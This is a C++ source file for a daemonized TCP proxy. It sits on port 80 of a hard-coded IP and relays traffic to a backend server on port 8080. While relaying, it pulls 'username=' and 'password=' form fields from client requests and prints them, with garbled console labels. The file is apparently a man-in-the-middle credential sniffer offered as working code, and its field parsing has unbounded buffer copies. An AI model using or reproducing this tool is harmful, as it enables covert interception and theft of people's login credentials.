#include <iostream>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fstream>
#include <sys/prctl.h>
#include <signal.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <sys/wait.h>

using namespace std;
#define BUFSIZE 1024
#define QUEUE 1000
#define PORT1 80
#define PORT2 8080
char ip1[]="192.168.2.231",ip2[]="192.168.1.102",ip3[]="10.60.102.252";

void func_waitpid(int signo)
{
	pid_t pid;
	int stat;
	while((pid=waitpid(-1,&stat,WNOHANG))>0);
}

int main(int argc ,char* argv[])
{
	daemon(0, 1);
	int i, j;
	signal(SIGCHLD, &func_waitpid);
	int server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in server_sockaddr, client_address;

	int enable = 1;
	if (setsockopt(server_sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
		perror("setsockopt(SO_REUSEADDR) failed");
	server_sockaddr.sin_family = AF_INET;
	server_sockaddr.sin_addr.s_addr = inet_addr(ip1);
	server_sockaddr.sin_port = htons(PORT1);

	if (bind(server_sockfd, (struct sockaddr *) &server_sockaddr, sizeof(server_sockaddr)) == -1)
	{
		perror("bind");
		exit(1);
	}
	if (listen(server_sockfd, QUEUE) == -1)
	{
		perror("listen");
		exit(1);
	}
	while (1)
	{
		socklen_t length = sizeof(struct sockaddr);
		int conn = accept(server_sockfd, (struct sockaddr *) &client_address, &length);
		if (conn < 0)
			exit(-1);
		if (!fork())
		{
			struct sockaddr_in addr_101, addr_252;
			int sockfd = socket(AF_INET, SOCK_STREAM, 0);
			if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
				perror("setsockopt(SO_REUSEADDR) failed");
			bzero((char *) &addr_101, sizeof(addr_101));
			addr_101.sin_family = AF_INET;
			inet_pton(AF_INET, ip2, &addr_101.sin_addr);
			addr_101.sin_port = htons(PORT2);
			if (bind(sockfd, (struct sockaddr *) &addr_101, sizeof(addr_101)) == -1)
			{
				perror("bind");
				exit(1);
			}
			bzero((char *) &addr_252, sizeof(addr_252));
			addr_252.sin_family = AF_INET;
			addr_252.sin_addr.s_addr = inet_addr(ip3);
			addr_252.sin_port = htons(PORT2);
			if (connect(sockfd, (struct sockaddr *) &addr_252, sizeof(addr_252)) < 0)
				return -1;
			int flag = -1, len;
			fd_set fdR;
			char unm[BUFSIZE], pwd[BUFSIZE];
			int max = conn;
			if (conn < sockfd)
				max = sockfd;
			while (1)
			{
				FD_ZERO(&fdR);
				FD_SET(conn, &fdR);
				FD_SET(sockfd, &fdR);
				if (select(max + 1, &fdR, NULL, NULL, 0) > 0)
				{
					if (FD_ISSET(sockfd, &fdR))
					{
						char buf_recv[BUFSIZE];
						memset(buf_recv, 0, BUFSIZE);
						if ((len = recv(sockfd, buf_recv, sizeof(buf_recv), 0)) <= 0)
							break;
						if ((!flag) && strstr(buf_recv, "<script>alert("))
						{
							flag = 1;
							memset(unm, 0, sizeof(unm));
							memset(pwd, 0, sizeof(pwd));
						}
						send(conn, buf_recv, len, 0);
					}
					if (FD_ISSET(conn, &fdR))
					{
						char buf_recv[BUFSIZE];
						memset(buf_recv, 0, sizeof((buf_recv)));
						if ((len = recv(conn, buf_recv, sizeof(buf_recv), 0)) <= 0)
							break;
						if (!flag)
						{
							cout << "ÓÃ»§Ãû:" << unm << endl;
							memset(unm, 0, sizeof(unm));
							cout << "ÃÜ Âë:" << pwd << endl;
							memset(pwd, 0, sizeof(pwd));
							flag = 1;
						}
						char *username = strstr(buf_recv, "username=");
						char *password = strstr(buf_recv, "password=");
						if (username && password)
						{
							while (*username != '=')
								username++;
							username++;
							i = 0;
							while (*username != '&')
							{
								unm[i] = *username;
								username++;
								i++;
							}
							while (*password != '=')
								password++;
							password++;
							j = 0;
							while (*password != '&')
							{
								pwd[j] = *password;
								password++;
								j++;
							}
							if (!i || !j)
							{
								flag = 1;
								memset(unm, 0, BUFSIZE);
								memset(pwd, 0, BUFSIZE);
							}
							else
								flag = 0;
						}
						send(sockfd, buf_recv, len, 0);
					}
				}
			}
			close(conn);
			close(sockfd);
			exit(0);
		}
		close(conn);
	}
}
